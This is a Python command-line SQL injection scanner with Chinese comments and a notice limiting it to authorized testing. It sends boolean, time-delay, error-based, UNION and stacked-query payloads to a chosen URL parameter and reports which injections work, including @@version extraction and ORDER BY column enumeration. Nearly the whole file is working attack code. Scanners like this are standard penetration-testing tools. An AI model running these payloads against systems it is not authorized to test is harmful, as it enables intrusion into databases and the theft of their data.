"""
SQL Injection Detector - SQL注入探测工具
支持检测类型：
  1. Boolean-based Blind (布尔盲注)
  2. Time-based Blind (时间盲注)
  3. Error-based (报错注入)
  4. Union-based (联合查询注入)
  5. Stacked Queries (堆叠注入)

用法:
  python sql_injection_detector.py -u "http://target/page?id=1" [options]

仅用于授权安全测试，未经授权使用属违法行为。
"""

import argparse
import re
import sys
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests
from requests.exceptions import RequestException


# ──────────────────────────────────────────────
# 颜色输出
# ──────────────────────────────────────────────
class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    BOLD = "\033[1m"
    END = "\033[0m"


def info(msg):
    print(f"{Color.BLUE}[*]{Color.END} {msg}")


def success(msg):
    print(f"{Color.GREEN}[+]{Color.END} {msg}")


def warn(msg):
    print(f"{Color.YELLOW}[!]{Color.END} {msg}")


def fail(msg):
    print(f"{Color.RED}[-]{Color.END} {msg}")


def header(msg):
    print(f"\n{Color.BOLD}{'='*60}\n  {msg}\n{'='*60}{Color.END}")


# ──────────────────────────────────────────────
# 工具函数
# ──────────────────────────────────────────────
# 常见数据库报错关键词
ERROR_PATTERNS = [
    # MySQL
    re.compile(r"SQL syntax.*?MySQL", re.IGNORECASE),
    re.compile(r"Warning.*?\Wmysqli?_", re.IGNORECASE),
    re.compile(r"MySQLSyntaxErrorException", re.IGNORECASE),
    re.compile(r"valid MySQL result", re.IGNORECASE),
    re.compile(r"check the manual that (corresponds to|fits) your MySQL server version", re.IGNORECASE),
    # PostgreSQL
    re.compile(r"PostgreSQL.*?ERROR", re.IGNORECASE),
    re.compile(r"Warning.*?\Wpg_", re.IGNORECASE),
    re.compile(r"valid PostgreSQL result", re.IGNORECASE),
    re.compile(r"Npgsql\.", re.IGNORECASE),
    # Microsoft SQL Server
    re.compile(r"Driver.*? SQL[\-\_\ ]*Server", re.IGNORECASE),
    re.compile(r"OLE DB.*? SQL Server", re.IGNORECASE),
    re.compile(r"(\bORA-\d{4,5})|(Oracle error)", re.IGNORECASE),
    re.compile(r"Microsoft SQL Native Client error", re.IGNORECASE),
    re.compile(r"ODBC SQL Server Driver", re.IGNORECASE),
    re.compile(r"SQLServer JDBC Driver", re.IGNORECASE),
    re.compile(r"com\.microsoft\.sqlserver\.jdbc", re.IGNORECASE),
    # Oracle
    re.compile(r"ORA-\d{4,5}", re.IGNORECASE),
    re.compile(r"Oracle.*?Driver", re.IGNORECASE),
    # SQLite
    re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
    re.compile(r"SQLite\.Exception", re.IGNORECASE),
    re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE),
    # Generic
    re.compile(r"SQL syntax.*?", re.IGNORECASE),
    re.compile(r"unclosed quotation mark", re.IGNORECASE),
    re.compile(r"unterminated string literal", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
]


def is_error_response(text):
    """检查响应内容是否包含数据库报错信息"""
    for pattern in ERROR_PATTERNS:
        if pattern.search(text):
            return True
    return False


def inject_payload(url, param, payload, method="GET", data=None, cookies=None, headers=None, timeout=10):
    """
    向指定参数注入 payload 并返回响应
    """
    sess = requests.Session()
    sess.headers.update(headers or {})

    if cookies:
        sess.cookies.update(cookies)

    if method.upper() == "GET":
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        resp = sess.get(new_url, timeout=timeout, allow_redirects=False)
    else:
        data = dict(data) if data else {}
        data[param] = payload
        resp = sess.post(url, data=data, timeout=timeout, allow_redirects=False)

    return resp


# ──────────────────────────────────────────────
# 检测模块
# ──────────────────────────────────────────────
class SQLiDetector:
    def __init__(self, url, param, method="GET", data=None, cookies=None,
                 headers=None, timeout=10, delay=5, proxy=None):
        self.url = url
        self.param = param
        self.method = method
        self.data = data
        self.cookies = cookies
        self.headers = headers or {}
        self.timeout = timeout
        self.delay = delay
        self.proxy = proxy
        self.results = []

        if proxy:
            self.headers["proxies"] = {"http": proxy, "https": proxy}

        # 先获取正常响应作为基线
        info(f"获取基线响应: {url} (参数 {param})")
        try:
            self.baseline = inject_payload(
                url, param, "1", method, data, cookies, headers, timeout
            )
            self.baseline_text = self.baseline.text
            self.baseline_status = self.baseline.status_code
            self.baseline_length = len(self.baseline.content)
            info(f"基线响应: 状态码={self.baseline_status}, 长度={self.baseline_length}")
        except RequestException as e:
            fail(f"无法连接目标: {e}")
            sys.exit(1)

    def _request(self, payload):
        return inject_payload(
            self.url, self.param, payload,
            self.method, self.data, self.cookies,
            self.headers, self.timeout
        )

    # ---------- 1. Boolean-based Blind ----------
    def detect_boolean_blind(self):
        header("检测 Boolean-based Blind Injection")
        # 用真/假条件对比响应差异
        true_payloads = ["1 AND 1=1", "1' AND '1'='1", "1\" AND \"1\"=\"1"]
        false_payloads = ["1 AND 1=2", "1' AND '1'='2", "1\" AND \"1\"=\"2"]

        for tp, fp in zip(true_payloads, false_payloads):
            try:
                true_resp = self._request(tp)
                false_resp = self._request(fp)

                true_len = len(true_resp.content)
                false_len = len(false_resp.content)

                # 真条件应接近基线，假条件应差异较大
                if true_len != false_len and abs(true_len - self.baseline_length) < abs(false_len - self.baseline_length):
                    success(f"发现 Boolean-based 盲注! Payload: {tp} / {fp}")
                    success(f"  真条件长度: {true_len}, 假条件长度: {false_len}, 基线长度: {self.baseline_length}")
                    self.results.append(("Boolean-based Blind", tp, fp))
                    return True
            except RequestException:
                continue

        fail("未发现 Boolean-based 盲注")
        return False

    # ---------- 2. Time-based Blind ----------
    def detect_time_blind(self):
        header("检测 Time-based Blind Injection")
        time_payloads = [
            f"1 AND SLEEP({self.delay})-- -",
            f"1' AND SLEEP({self.delay})-- -",
            f"1\" AND SLEEP({self.delay})-- -",
            # PostgreSQL
            f"1; SELECT pg_sleep({self.delay})-- -",
            # SQL Server
            f"1; WAITFOR DELAY '0:0:{self.delay}'-- -",
        ]

        for payload in time_payloads:
            try:
                start = time.time()
                self._request(payload)
                elapsed = time.time() - start

                if elapsed >= self.delay - 1:  # 允许1秒误差
                    success(f"发现 Time-based 盲注! Payload: {payload}")
                    success(f"  响应耗时: {elapsed:.2f}s (预期延迟: {self.delay}s)")
                    self.results.append(("Time-based Blind", payload, f"delay={elapsed:.2f}s"))
                    return True
            except RequestException:
                continue

        fail("未发现 Time-based 盲注")
        return False

    # ---------- 3. Error-based ----------
    def detect_error_based(self):
        header("检测 Error-based Injection")
        error_payloads = [
            "1'",
            '1"',
            "1 AND 1=CONVERT(int, (SELECT @@version))-- -",
            "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "1 AND updatexml(1, CONCAT(0x7e, (SELECT @@version)), 1)-- -",
        ]

        for payload in error_payloads:
            try:
                resp = self._request(payload)
                if is_error_response(resp.text):
                    success(f"发现 Error-based 注入! Payload: {payload}")
                    # 尝试识别数据库类型
                    db_type = self._identify_db(resp.text)
                    if db_type:
                        success(f"  识别到数据库类型: {db_type}")
                    self.results.append(("Error-based", payload, db_type or "Unknown"))
                    return True
            except RequestException:
                continue

        fail("未发现 Error-based 注入")
        return False

    # ---------- 4. Union-based ----------
    def detect_union_based(self):
        header("检测 Union-based Injection")
        # 先用 ORDER BY 确定列数
        info("尝试通过 ORDER BY 确定列数...")
        max_col = 20
        col_count = None

        for i in range(1, max_col + 1):
            payload = f"1 ORDER BY {i}-- -"
            try:
                resp = self._request(payload)
                if resp.status_code in (500,) or is_error_response(resp.text):
                    col_count = i - 1
                    break
            except RequestException:
                continue

        if col_count and col_count > 0:
            success(f"检测到 {col_count} 列")
            # 尝试 UNION SELECT
            placeholders = ",".join(["NULL"] * col_count)
            payload = f"1 UNION SELECT {placeholders}-- -"
            try:
                resp = self._request(payload)
                if resp.status_code == 200 and not is_error_response(resp.text):
                    success(f"发现 Union-based 注入! 列数: {col_count}")
                    success(f"  Payload: {payload}")
                    self.results.append(("Union-based", payload, f"columns={col_count}"))
                    return True
            except RequestException:
                pass

        # 也尝试带引号的
        for quote in ["'", '"']:
            for i in range(1, max_col + 1):
                payload = f"1{quote} ORDER BY {i}-- -"
                try:
                    resp = self._request(payload)
                    if resp.status_code in (500,) or is_error_response(resp.text):
                        col_count = i - 1
                        if col_count > 0:
                            placeholders = ",".join(["NULL"] * col_count)
                            upayload = f"1{quote} UNION SELECT {placeholders}-- -"
                            resp2 = self._request(upayload)
                            if resp2.status_code == 200:
                                success(f"发现 Union-based 注入! 列数: {col_count} (引号: {quote})")
                                self.results.append(("Union-based", upayload, f"columns={col_count}"))
                                return True
                        break
                except RequestException:
                    continue

        fail("未发现 Union-based 注入")
        return False

    # ---------- 5. Stacked Queries ----------
    def detect_stacked_queries(self):
        header("检测 Stacked Queries Injection")
        stacked_payloads = [
            "1; SELECT 1-- -",
            "1'; SELECT 1-- -",
            '1"; SELECT 1-- -',
            "1; SELECT SLEEP(1)-- -",
        ]

        for payload in stacked_payloads:
            try:
                resp = self._request(payload)
                # 堆叠查询成功通常不会报错
                if resp.status_code == 200 and not is_error_response(resp.text):
                    # 进一步通过时间验证
                    if "SLEEP" in payload:
                        start = time.time()
                        self._request(payload)
                        elapsed = time.time() - start
                        if elapsed >= 1:
                            success(f"发现 Stacked Queries 注入! Payload: {payload}")
                            self.results.append(("Stacked Queries", payload, "confirmed"))
                            return True
                    else:
                        # 对比正常请求，如果没有报错则可能存在
                        success(f"可能存在 Stacked Queries 注入! Payload: {payload}")
                        self.results.append(("Stacked Queries", payload, "possible"))
                        return True
            except RequestException:
                continue

        fail("未发现 Stacked Queries 注入")
        return False

    def _identify_db(self, text):
        """从报错信息中识别数据库类型"""
        db_signatures = {
            "MySQL": [r"MySQL", r"mysqli", r"mysql_"],
            "PostgreSQL": [r"PostgreSQL", r"pg_", r"Npgsql"],
            "SQL Server": [r"SQL Server", r"ODBC SQL Server", r"SQLServer"],
            "Oracle": [r"ORA-\d{4,5}", r"Oracle"],
            "SQLite": [r"SQLite"],
        }
        for db, sigs in db_signatures.items():
            for sig in sigs:
                if re.search(sig, text, re.IGNORECASE):
                    return db
        return None

    def run_all(self):
        """执行全部检测"""
        header("SQL Injection Detection - SQL注入探测")
        info(f"目标: {self.url}")
        info(f"测试参数: {self.param}")
        info(f"请求方法: {self.method}")
        print()

        self.detect_boolean_blind()
        self.detect_time_blind()
        self.detect_error_based()
        self.detect_union_based()
        self.detect_stacked_queries()

        # 汇总
        header("检测结果汇总")
        if self.results:
            for idx, (vuln_type, payload, detail) in enumerate(self.results, 1):
                success(f"[{idx}] {vuln_type} | Payload: {payload} | {detail}")
        else:
            warn("未发现SQL注入漏洞")
        print()
        return self.results


# ──────────────────────────────────────────────
# 主入口
# ──────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Detector - SQL注入探测工具",
        epilog="仅用于授权安全测试，未经授权使用属违法行为。"
    )
    parser.add_argument("-u", "--url", required=True, help="目标URL (如 http://target/page?id=1)")
    parser.add_argument("-p", "--param", help="要测试的参数名 (不指定则自动检测GET参数)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="请求方法 (默认GET)")
    parser.add_argument("-d", "--data", help="POST数据 (如 'user=admin&pass=test')")
    parser.add_argument("-c", "--cookies", help="Cookie字符串 (如 'session=abc123')")
    parser.add_argument("--delay", type=int, default=5, help="时间盲注延迟秒数 (默认5)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认10)")
    parser.add_argument("--proxy", help="代理地址 (如 http://127.0.0.1:8080)")
    parser.add_argument("--skip", nargs="+", default=[], choices=["boolean", "time", "error", "union", "stacked"],
                        help="跳过指定检测类型")

    args = parser.parse_args()

    # 解析参数
    parsed = urlparse(args.url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if args.param:
        test_params = [args.param]
    elif params:
        test_params = list(params.keys())
        info(f"自动检测参数: {test_params}")
    else:
        fail("未找到可测试的参数，请使用 -p 手动指定")
        sys.exit(1)

    # 解析 cookies
    cookies = None
    if args.cookies:
        cookies = dict(item.split("=", 1) for item in args.cookies.split(";") if "=" in item)

    # 解析 POST data
    data = None
    if args.data:
        data = dict(item.split("=", 1) for item in args.data.split("&") if "=" in item)

    all_results = []
    for param in test_params:
        detector = SQLiDetector(
            url=args.url, param=param, method=args.method,
            data=data, cookies=cookies, timeout=args.timeout,
            delay=args.delay, proxy=args.proxy
        )

        # 按需跳过
        if "boolean" not in args.skip:
            detector.detect_boolean_blind()
        if "time" not in args.skip:
            detector.detect_time_blind()
        if "error" not in args.skip:
            detector.detect_error_based()
        if "union" not in args.skip:
            detector.detect_union_based()
        if "stacked" not in args.skip:
            detector.detect_stacked_queries()

        all_results.extend(detector.results)

    # 最终汇总
    header("全部参数检测结果汇总")
    if all_results:
        for idx, (vuln_type, payload, detail) in enumerate(all_results, 1):
            success(f"[{idx}] {vuln_type} | {payload} | {detail}")
    else:
        warn("所有参数均未发现SQL注入漏洞")


if __name__ == "__main__":
    main()
